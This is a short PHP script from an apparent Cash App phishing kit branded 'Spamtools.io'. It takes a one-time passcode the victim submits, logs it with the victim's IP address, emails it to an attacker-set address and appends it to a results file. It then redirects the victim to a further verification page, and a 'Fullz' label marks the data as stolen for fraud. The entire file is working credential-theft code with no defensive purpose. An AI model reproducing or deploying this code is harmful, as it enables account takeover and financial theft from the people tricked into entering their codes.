<?php
error_reporting(0);
include "bt.php";
include 'email.php';

$hostname = gethostbyaddr($ip);
$bilsmg = "------------[Cash APP OTP - Spamtools.io]------------\n";
$bilsmg .= "-----------OTP------------\n";
$bilsmg .= "Username: ".$_POST['code']."\n";
$bilsmg .= "IP: ".$ip."\n";
$bilsmg .= "------------[CashAPP Fullz]------------\n";
$bilsub = "";
$bilhead = "MIME-Version: 2.0\n";
mail($email,$bilsub,$bilsmg,$bilhead);
$fp = fopen("results/OTP.txt", "a+");
fwrite($fp, $bilsmg);
fclose($fp);
header("Location: verify.php");
?>